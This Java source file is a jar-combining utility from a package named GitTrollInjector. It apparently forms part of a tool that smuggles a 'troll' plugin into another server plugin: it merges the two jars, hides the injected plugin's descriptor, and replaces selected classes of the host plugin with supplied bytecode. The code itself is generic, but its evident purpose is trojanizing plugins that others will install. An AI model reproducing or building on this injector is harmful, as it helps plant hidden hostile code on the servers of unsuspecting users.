package net.Lenni0451.GitTrollInjector.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

public class JarCombiner {
	
	public static File combineJars(final File gitTroll, final File otherPlugin, final Map<String, byte[]> classReplacement) throws IOException {
		File temp = File.createTempFile("combined", ".jar");
		combineJars(gitTroll, otherPlugin, temp, classReplacement);
		return temp;
	}
	
	public static void combineJars(final File gitTroll, final File otherPlugin, final File out, final Map<String, byte[]> classReplacement) throws FileNotFoundException, IOException {
		JarOutputStream jarOut = new JarOutputStream(new FileOutputStream(out));
		
		List<String> addedEntries = new ArrayList<>();
		
		JarInputStream jar1In = new JarInputStream(new FileInputStream(gitTroll));
		ZipEntry entry;
		while((entry = jar1In.getNextEntry()) != null) {
			if(entry.getName().equalsIgnoreCase("plugin.yml")) {
				continue;
			}
			addedEntries.add(entry.getName());
			jarOut.putNextEntry(entry);
			byte[] buffer = new byte[1024];
			int length;
			while((length = jar1In.read(buffer)) != -1) {
				jarOut.write(buffer, 0, length);
			}
		}
		jar1In.close();
		
		JarInputStream jar2In = new JarInputStream(new FileInputStream(otherPlugin));
		while((entry = jar2In.getNextEntry()) != null) {
			if(addedEntries.contains(entry.getName())) {
				System.err.println("Warning: The jar entry '" + entry.getName() + "' is already in the out jar. Skipping it...");
				continue;
			} else {
				addedEntries.add(entry.getName());
			}
			jarOut.putNextEntry(entry);
			if(classReplacement.containsKey(entry.getName())) {
				jarOut.write(classReplacement.get(entry.getName()));
			} else {
				byte[] buffer = new byte[1024];
				int length;
				while((length = jar2In.read(buffer)) != -1) {
					jarOut.write(buffer, 0, length);
				}
			}
		}
		jar2In.close();
		
		jarOut.close();
	}
	
}
